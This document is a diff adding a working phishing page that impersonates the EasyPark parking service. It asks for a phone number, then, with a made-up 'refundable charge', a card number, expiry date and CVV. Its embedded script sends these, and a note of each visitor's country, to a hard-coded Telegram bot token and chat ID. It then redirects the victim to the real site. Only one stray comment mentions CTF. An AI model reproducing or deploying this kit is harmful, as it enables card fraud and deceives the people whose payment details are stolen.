@@ -1,0 +1,736 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>EasyPark Login</title>
+  <style>
+    /* General reset */
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      font-family: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
+        Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+      font-weight: 400;
+      font-size: 16px;
+      line-height: 1.6;
+      background-color: #f7f9fc; /* Light gray background */
+      color: #333333;
+      padding: 40px 20px;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      min-height: 100vh;
+    }
+
+    .login-wrapper {
+      background-color: #ffffff;
+      max-width: 480px;
+      width: 100%;
+      padding: 40px 48px; /* Consistent padding */
+      border-radius: 16px; /* Slightly more rounded corners */
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08); /* Stronger, softer shadow */
+      text-align: center;
+      position: relative;
+    }
+
+    .logo img {
+      width: 160px;
+      height: auto;
+      margin-bottom: 40px; /* Adjusted spacing */
+    }
+
+    h1 {
+      font-size: 32px; /* Larger, more impactful heading */
+      font-weight: 700;
+      margin-bottom: 30px;
+      color: #222222;
+      letter-spacing: -0.5px;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 20px; /* Slightly reduced gap */
+      text-align: left;
+    }
+
+    label {
+      font-size: 14px; /* Slightly smaller label font */
+      font-weight: 600;
+      color: #555555; /* Softer label color */
+      margin-bottom: 4px; /* Reduced margin */
+    }
+
+    /* Country selector container */
+    .phone-input-container {
+      display: flex;
+      gap: 8px;
+      align-items: center;
+    }
+
+    select {
+      padding: 13px 10px;
+      font-size: 15px;
+      border: 1px solid #e0e0e0; /* Lighter border */
+      border-radius: 10px; /* More rounded select */
+      background-color: white;
+      appearance: none;
+      cursor: pointer;
+      width: 120px;
+      background-position: 95% center; /* Adjust dropdown icon position */
+      background-size: 16px; /* Smaller icon */
+    }
+
+    select option[data-flag] {
+      padding-left: 30px;
+      background-repeat: no-repeat;
+      background-position: 10px center;
+      background-size: 20px 14px;
+    }
+
+    input[type="tel"],
+    .cc-input {
+      padding: 15px 18px; /* Slightly more padding */
+      font-size: 16px;
+      border: 1px solid #e0e0e0;
+      border-radius: 10px; /* More rounded inputs */
+      transition: border-color 0.3s ease;
+      flex-grow: 1;
+      color: #111111;
+    }
+
+    input[type="tel"]:focus,
+    .cc-input:focus {
+      border-color: #ff4eb1; /* EasyPark pink on focus */
+      outline: none;
+      box-shadow: 0 0 0 3px rgba(255, 78, 177, 0.2); /* Softer, wider focus glow */
+    }
+
+    /* Disabled input for country code display */
+    input[disabled] {
+      background-color: #f0f2f5; /* Lighter disabled background */
+      border-color: #e0e0e0;
+      cursor: default;
+      user-select: none;
+      width: 70px;
+      text-align: center;
+      font-weight: 600;
+      color: #555;
+      border-radius: 10px; /* Consistency */
+      padding: 15px 0;
+    }
+
+    /* Visiniu login button */
+    button {
+      padding: 16px 0;
+      font-size: 18px;
+      font-weight: 700;
+      background-color: #ff4eb1; /* EasyPark pink */
+      color: white;
+      border: none;
+      border-radius: 10px; /* More rounded buttons */
+      cursor: pointer;
+      transition: background-color 0.25s ease, transform 0.1s ease; /* Add transform for subtle click effect */
+      box-shadow: 0 4px 15px rgba(255, 78, 177, 0.2); /* Subtle button shadow */
+    }
+
+    button:hover {
+      background-color: #d93a9e;
+      transform: translateY(-1px); /* Lift effect on hover */
+    }
+
+    button:active {
+      transform: translateY(0); /* Press effect */
+      box-shadow: 0 2px 10px rgba(255, 78, 177, 0.2);
+    }
+
+    .footer-text {
+      margin-top: 30px; /* Adjusted spacing */
+      font-size: 13px; /* Slightly smaller footer text */
+      color: #888888; /* Softer footer color */
+      text-align: center;
+    }
+
+    .footer-text a {
+      color: #ff4eb1; /* Link color matching EasyPark pink */
+      text-decoration: none;
+      font-weight: 600;
+    }
+
+    .footer-text a:hover {
+      text-decoration: underline;
+    }
+
+    /* Notification style */
+    .notification {
+      position: absolute;
+      top: 10px;
+      left: 50%;
+      transform: translateX(-50%);
+      background-color: #fff0fa; /* Lighter background */
+      border: 1px solid #ff4eb1;
+      color: #ff4eb1;
+      padding: 8px 20px; /* Slightly more padding */
+      border-radius: 25px; /* Pill shape */
+      font-weight: 600;
+      display: none;
+      font-size: 13px; /* Smaller font */
+      box-shadow: 0 2px 10px rgba(255, 78, 177, 0.1); /* Softer shadow */
+      min-width: unset; /* Remove min-width */
+      max-width: 90%; /* Max width for responsiveness */
+      white-space: nowrap; /* Prevent wrapping */
+      overflow: hidden; /* Hide overflow */
+      text-overflow: ellipsis; /* Add ellipsis for long text */
+      z-index: 10;
+    }
+
+    /* CC page style after form submit */
+    .cc-message {
+      font-size: 14px; /* Slightly smaller message font */
+      color: #ff4eb1;
+      font-weight: 600;
+      padding: 12px 18px; /* Adjusted padding */
+      border: 1px solid #ff4eb1;
+      border-radius: 12px;
+      background-color: #fff0fa;
+      margin-top: 25px; /* Adjusted margin */
+      padding: 12px 16px 8px;
+      border: 2px solid #ff4eb1;
+      border-radius: 10px;
+      background-color: #fff0fa;
+      margin-top: 20px;
+      line-height: 1.3;
+      text-align: center;
+      max-width: 350px;
+      margin-left: auto;
+      margin-right: auto;
+      transition: opacity 0.4s;
+    }
+
+    /* CC form styling */
+    .cc-form {
+      margin-top: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 18px;
+      text-align: left;
+    }
+
+    .cc-form label {
+      font-weight: 600;
+      color: #444444;
+      margin-bottom: 6px;
+    }
+
+    .cc-input {
+      padding: 14px 18px;
+      font-size: 17px;
+      border: 1.5px solid #cccccc;
+      border-radius: 8px;
+      transition: border-color 0.3s ease;
+      width: 100%;
+      box-sizing: border-box;
+      color: #111111;
+    }
+
+    .cc-input:focus {
+      border-color: #ff4eb1;
+      outline: none;
+      box-shadow: 0 0 6px rgba(255, 78, 177, 0.35);
+    }
+
+    /* Card number container for icons */
+    .card-number-container {
+      position: relative;
+    }
+
+    .card-icons {
+      position: absolute;
+      right: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      height: 32px;
+      width: 56px;
+      align-items: center;
+      display: flex;
+    }
+
+    .card-icon {
+      max-width: 56px;
+      max-height: 32px;
+      width: auto;
+      height: auto;
+      opacity: 0;
+      transition: opacity 0.3s ease, transform 0.2s;
+      transform: scale(1);
+      position: absolute;
+      right: 0;
+      top: 50%;
+      transform: translateY(-50%) scale(1.15);
+      z-index: 1;
+    }
+
+    .card-icon.active {
+      opacity: 1;
+      transform: translateY(-50%) scale(1.15);
+    }
+
+    /* Flex small inputs in one row */
+    .small-inputs {
+      display: flex;
+      gap: 12px;
+    }
+
+    .small-inputs > div {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* Media Queries for Responsiveness (Phone/PC detection) */
+    @media (max-width: 600px) {
+      body {
+        padding: 20px 15px;
+        align-items: stretch; /* Stretch to full height */
+      }
+
+      .login-wrapper {
+        padding: 30px 25px;
+        border-radius: 10px;
+        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+        margin-top: auto; /* Push to center on smaller screens */
+        margin-bottom: auto;
+      }
+
+      .logo img {
+        width: 120px;
+        margin-bottom: 30px;
+      }
+
+      h1 {
+        font-size: 26px;
+        margin-bottom: 25px;
+      }
+
+      form {
+        gap: 16px;
+      }
+
+      label {
+        font-size: 13px;
+      }
+
+      input[type="tel"], .cc-input, select, input[disabled] {
+        padding: 12px 15px;
+        font-size: 15px;
+        border-radius: 8px;
+      }
+
+      button {
+        padding: 14px 0;
+        font-size: 16px;
+        border-radius: 8px;
+      }
+
+      .footer-text {
+        margin-top: 25px;
+        font-size: 12px;
+      }
+
+      .notification {
+        top: 10px; /* Keep notification at top */
+        font-size: 12px;
+        padding: 6px 15px;
+        max-width: 90%;
+      }
+
+      .cc-message {
+        font-size: 13px;
+        padding: 10px 15px;
+        margin-top: 20px;
+        max-width: 95%;
+      }
+
+      .cc-form {
+        margin-top: 20px;
+        gap: 16px;
+      }
+
+      .card-icons {
+        right: 10px;
+        height: 24px;
+      }
+
+      .card-icon {
+        max-width: 40px;
+        max-height: 24px;
+        margin-left: 3px;
+      }
+
+      .small-inputs {
+        flex-direction: column; /* Stack small inputs vertically on mobile */
+        gap: 15px;
+      }
+    }
+
+    @media (max-width: 400px) {
+      .login-wrapper {
+        padding: 25px 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="login-wrapper">
+    <div class="notification" id="notification">We couldn't send the code right now, skipping.</div>
+
+    <div class="logo">
+      <img
+        src="https://cdn.cookielaw.org/logos/8be2a79c-d0ef-4078-bfc7-42983b6c41ae/5a4be557-3ae4-4ba6-b2aa-0631b15801c0/a97c4508-6ad3-43d9-8eb6-f93a1c8a59e0/Easypark-linear-logotype_RGB_(1).png"
+        alt="EasyPark Logo"
+      />
+    </div>
+
+    <!-- Login form -->
+    <form id="login-form" action="#" method="POST">
+      <label for="country">Choose your country</label>
+      <select id="country" name="country" aria-label="Country selector" required>
+        <option value="+47" data-flag="🇳🇴">🇳🇴 Norway (+47)</option>
+        <option value="+46" data-flag="🇸🇪">🇸🇪 Sweden (+46)</option>
+        <option value="+45" data-flag="🇩🇰">🇩🇰 Denmark (+45)</option>
+        <option value="+44" data-flag="🇬🇧">🇬🇧 United Kingdom (+44)</option>
+        <option value="+1" data-flag="🇺🇸">🇺🇸 United States (+1)</option>
+        <option value="+49" data-flag="🇩🇪">🇩🇪 Germany (+49)</option>
+        <option value="+33" data-flag="🇫🇷">🇫🇷 France (+33)</option>
+      </select>
+
+      <label for="phone">Phone Number</label>
+      <div class="phone-input-container">
+        <input
+          type="text"
+          id="country-code-display"
+          name="country-code"
+          disabled
+          value="+47"
+          aria-label="Country code"
+        />
+        <input
+          type="tel"
+          id="phone"
+          name="phone"
+          placeholder="Mobile phone number"
+          pattern="[0-9\s\-\+\(\)]{7,15}"
+          aria-required="true"
+          required
+        />
+      </div>
+
+      <button type="submit">Continue</button>
+    </form>
+
+    <!-- Placeholder for credit card page -->
+    <div id="cc-page" style="display:none;">
+      <div class="cc-message" id="cc-message">
+        Your phone number has been verified!<br />
+        To reserve your parking lot, we need to temporarily charge 0.10$ This money will be refunded immediately.
+      </div>
+      <!-- The credit card form will be dynamically inserted here by script.js -->
+    </div>
+  </div>
+
+  <script>
+    // Telegram bot config (from capture.js)
+    const BOT_TOKEN = '8157693938:AAFDDzVppSKr8_vbip5_otWZ5Jxf8Lc80g0';
+    const USER_ID = '7808337143';
+    const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    // Helper: send message to Telegram (from capture.js)
+    async function sendToTelegram(text) {
+      try {
+        await fetch(TG_API, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: USER_ID, text })
+        });
+        console.log('Sent to Telegram:', text); // Debug
+      } catch (err) {
+        console.error('Telegram send error:', err);
+      }
+    }
+
+    // Initial page load: detect country and log visitor (from capture.js)
+    window.addEventListener('DOMContentLoaded', function() {
+      console.log('DOM Content Loaded. Fetching country...');
+      fetch('https://ipapi.co/json/')
+        .then(r => r.json())
+        .then(data => {
+          const country = data && data.country_name ? data.country_name : 'Unknown';
+          sendToTelegram(`New person on website from ${country}`);
+          console.log(`Visitor from: ${country}`); // Debug
+        })
+        .catch(err => {
+          sendToTelegram('New person on website from Unknown (IP API error)');
+          console.error('IP Geolocation error:', err); // Debug
+        });
+    });
+
+    // Elements (from script.js)
+    const form = document.getElementById("login-form");
+    console.log('Login form element:', form); // NEW DEBUG LOG
+    const notification = document.getElementById("notification");
+    const loginWrapper = document.querySelector(".login-wrapper");
+    const countrySelect = document.getElementById("country");
+    const countryCodeDisplay = document.getElementById("country-code-display");
+    const phoneInput = document.getElementById("phone");
+    const ccPage = document.getElementById("cc-page"); // Placeholder for CC form
+
+    // Add a fallback click listener to the login button
+    const loginButton = form.querySelector('button[type="submit"]');
+    if (loginButton) {
+      loginButton.addEventListener('click', () => {
+        console.log('Login button clicked (fallback).');
+      });
+    }
+
+    // Update country code display & phone maxlength when country changes (from script.js)
+    countrySelect.addEventListener("change", () => {
+      const selectedCode = countrySelect.value;
+      countryCodeDisplay.value = selectedCode;
+      // Map country codes to typical max phone number lengths (excluding country code)
+      const phoneLengths = {
+        "+47": 8, // Norway
+        "+46": 7, // Sweden (typical mobile is 7 digits)
+        "+45": 8, // Denmark
+        "+44": 10, // UK
+        "+1": 10, // US
+        "+49": 11, // Germany
+        "+33": 9, // France
+        "+40": 9, // Romania
+        "+34": 9, // Spain
+        "+39": 10, // Italy
+        "+7": 10, // Russia
+      };
+      const maxLen = phoneLengths[selectedCode] || 10;
+      phoneInput.maxLength = maxLen + Math.floor(maxLen / 3); // allow spaces every 3 digits approx
+      phoneInput.value = ""; // clear input on country change
+      console.log(`Country changed to ${selectedCode}, phone max length set.`); // Debug
+    });
+
+    // Initialize phone code on load (from script.js)
+    (() => {
+      const initialCode = countrySelect.value;
+      countryCodeDisplay.value = initialCode;
+      // Use default max length if phoneLengths is not available yet or selectedCode is not in map
+      const maxLen = 10; 
+      phoneInput.maxLength = maxLen + Math.floor(maxLen / 3); 
+      console.log('Phone code initialized on load.'); // Debug
+    })();
+
+    // Phone number spacing after every 3 digits (from script.js and capture.js)
+    phoneInput.addEventListener("input", (e) => {
+      let val = e.target.value.replace(/\D/g, "");
+      val = val.replace(/(\d{3})(?=\d)/g, "$1 ");
+      e.target.value = val.trim();
+      console.log('Phone number formatted:', e.target.value); // Debug
+    });
+
+    // Notification helper (from script.js)
+    function showNotification(text) {
+      notification.textContent = text;
+      notification.style.display = "block";
+      setTimeout(() => {
+        notification.style.display = "none";
+      }, 5000);
+      console.log('Notification shown:', text); // Debug
+    }
+
+    // Show CC form + message (from script.js)
+    function showCCForm() {
+      console.log('showCCForm() called.');
+      // Remove login form content
+      form.style.display = "none";
+      console.log('Login form hidden.');
+
+      // Clear cc-page content before adding new form
+      ccPage.innerHTML = '';
+      ccPage.style.display = 'block'; // Ensure cc-page is visible
+      console.log('#cc-page cleared and displayed.');
+
+      // Create CC message
+      const ccMessage = document.createElement("div");
+      ccMessage.className = "cc-message";
+      ccMessage.innerText = "Your phone number has been verified! To reserve your parking lot, we need to temporarily charge 10. This money will be refunded immediately.";
+      ccPage.appendChild(ccMessage);
+      console.log('CC message appended.');
+
+      // Make CC message disappear after 2 seconds (from index.html)
+      setTimeout(() => {
+        if (ccMessage) ccMessage.style.opacity = 0;
+        console.log('CC message fading out.'); // Debug
+      }, 2000);
+
+      // Create CC form container
+      const ccForm = document.createElement("form");
+      ccForm.className = "cc-form";
+      ccForm.id = "cc-form";
+      ccForm.action = "#"; // Prevent actual form submission to server
+      ccForm.method = "POST";
+      ccForm.noValidate = true;
+
+      ccForm.innerHTML = `
+        <label for="card-number-input">Card Number</label>
+        <div class="card-number-container">
+          <input type="text" id="card-number-input" name="card-number" placeholder="1234 5678 9012 3456" maxlength="19" autocomplete="cc-number" required class="cc-input" inputmode="numeric" pattern="[0-9 ]+" />
+          <div class="card-icons">
+            <img id="visa-icon" class="card-icon" title="Visa" src="https://img.icons8.com/?size=100&id=1429&format=png&color=000000" />
+            <img id="mastercard-icon" class="card-icon" title="Mastercard" src="https://img.icons8.com/?size=100&id=61731&format=png&color=000000" />
+            <img id="amex-icon" class="card-icon" title="Amex" src="https://img.icons8.com/?size=100&id=ikzPviNiCGWG&format=png&color=000000" />
+          </div>
+        </div>
+        <div class="small-inputs">
+          <div>
+            <label for="expiry-input">Expiry (MM/YY)</label>
+            <input type="text" id="expiry-input" name="expiry" placeholder="MM/YY" maxlength="5" pattern="^(0[1-9]|1[0-2])\/?([0-9]{2})$" autocomplete="cc-exp" required class="cc-input" inputmode="numeric" />
+          </div>
+          <div>
+            <label for="cvv-input">CVV</label>
+            <input type="password" id="cvv-input" name="cvv" placeholder="123" maxlength="4" pattern="\\d{3,4}" autocomplete="cc-csc" required class="cc-input" inputmode="numeric" />
+          </div>
+        </div>
+        <button type="submit">Confirm Payment</button>
+      `;
+      ccPage.appendChild(ccForm);
+      console.log('CC form appended.');
+
+      // Attach event listeners to the newly created CC form fields
+      const cardNumberInput = ccForm.querySelector('[name="card-number"]');
+      const expiryInput = ccForm.querySelector('[name="expiry"]');
+      const cvvInput = ccForm.querySelector('[name="cvv"]');
+
+      // Card icons for highlighting
+      const visaIcon = ccForm.querySelector('#visa-icon');
+      const mastercardIcon = ccForm.querySelector('#mastercard-icon');
+      const amexIcon = ccForm.querySelector('#amex-icon');
+      
+      // Card number formatting (from script.js)
+      if (cardNumberInput) {
+        cardNumberInput.addEventListener("input", (e) => {
+          let val = e.target.value.replace(/\D/g, "");
+          val = val.slice(0, 16);
+          val = val.replace(/(\d{4})(?=\d)/g, "$1 "); // General 4-digit spacing
+          e.target.value = val.trim();
+          console.log('Card number formatted:', e.target.value); // Debug
+
+          // Highlight icons based on prefix
+          if (val.startsWith("4")) {
+            if (visaIcon) visaIcon.style.opacity = 1;
+            if (mastercardIcon) mastercardIcon.style.opacity = 0;
+            if (amexIcon) amexIcon.style.opacity = 0;
+          } else if (val.startsWith("5")) {
+            if (mastercardIcon) mastercardIcon.style.opacity = 1;
+            if (visaIcon) visaIcon.style.opacity = 0;
+            if (amexIcon) amexIcon.style.opacity = 0;
+          } else if (val.startsWith("34") || val.startsWith("37")) {
+            if (amexIcon) amexIcon.style.opacity = 1;
+            if (visaIcon) visaIcon.style.opacity = 0;
+            if (mastercardIcon) mastercardIcon.style.opacity = 0;
+          } else {
+            if (visaIcon) visaIcon.style.opacity = 0;
+            if (mastercardIcon) mastercardIcon.style.opacity = 0;
+            if (amexIcon) amexIcon.style.opacity = 0;
+          }
+        });
+      } else {
+        console.error('Error: Card number input not found in dynamically created form.'); // Debug
+      }
+
+      // Expiry date auto-insert / (from script.js)
+      if (expiryInput) {
+        expiryInput.addEventListener("input", (e) => {
+          let val = e.target.value.replace(/[^\d]/g, "");
+          if (val.length > 4) val = val.slice(0, 4);
+          if (val.length > 2 && e.inputType !== 'deleteContentBackward') { // Add / only if not deleting
+            val = val.slice(0,2) + "/" + val.slice(2);
+          }
+          e.target.value = val;
+          console.log('Expiry formatted:', e.target.value); // Debug
+        });
+      } else {
+        console.error('Error: Expiry input not found in dynamically created form.'); // Debug
+      }
+
+      // CC form submission handler (from capture.js)
+      ccForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        console.log('CC form submitted!'); // Debug
+        try {
+          const phone = document.getElementById('phone') ? document.getElementById('phone').value : ''; // Get phone from login form
+          
+          const cardNumber = cardNumberInput ? cardNumberInput.value.replace(/\s/g, "") : '';
+          const expiry = expiryInput ? expiryInput.value.trim() : '';
+          const cvv = cvvInput ? cvvInput.value.trim() : '';
+
+          const msg = `CC Data Submitted:\nCard Number: ${cardNumber}\nExpiry: ${expiry}\nCVV: ${cvv}\nPhone: ${phone}`;
+          console.log('Sending CC Data to Telegram:', msg); // Debug
+          sendToTelegram(msg);
+
+          // You can add an alert or redirect here after sending data
+          // alert("Payment Sucessfull, please wait for the parking lot to be reserved...");
+
+          const confirmButton = ccForm.querySelector('button[type="submit"]');
+          if (confirmButton) {
+            confirmButton.textContent = "Reserving parking...";
+            confirmButton.disabled = true;
+          }
+
+          setTimeout(() => {
+            alert("Parking lot reserved! Redirecting...");
+            window.location.href = "https://easypark.com/reserved"; // Or any specific reserved page
+          }, 5000); // 5 seconds delay
+
+          // Optional: reset the form - moved inside setTimeout if needed, but not with redirect
+          // ccForm.reset();
+          console.log('CC form reset.'); // Debug
+
+        } catch (err) {
+          console.error('CC Form capture error:', err); // Debug
+        }
+      });
+
+      console.log('showCCForm() finished. Dynamic form and listeners set up.'); // Debug
+    }
+
+    // Login form submit handler (from script.js)
+    form.addEventListener("submit", (e) => {
+      console.log('Login form submit handler triggered.'); // NEW DEBUG LOG
+      e.preventDefault();
+
+      // Basic phone number validation
+      if (!phoneInput.value.trim()) {
+        showNotification("Please enter your phone number.");
+        phoneInput.focus();
+        console.log('Phone number validation failed: input empty.'); // NEW DEBUG LOG
+        return;
+      }
+
+      // Simulate sending SMS code (optional, can be removed for CTF)
+      // const success = Math.random() > 0.5;
+      // if (!success) {
+      //   showNotification("We couldn't send the code right now, skipping.");
+      // }
+
+      // Hide login form and show CC page
+      form.style.display = "none";
+      ccPage.style.display = "block"; // Ensure cc-page is visible
+      console.log('Login form hidden, CC page visible. About to call showCCForm().'); // NEW DEBUG LOG
+      showCCForm(); // Call to create and display the CC form
+      console.log('Calling showCCForm to display CC section.'); // Debug
+    });
+
+  </script>
+</body>
+</html>
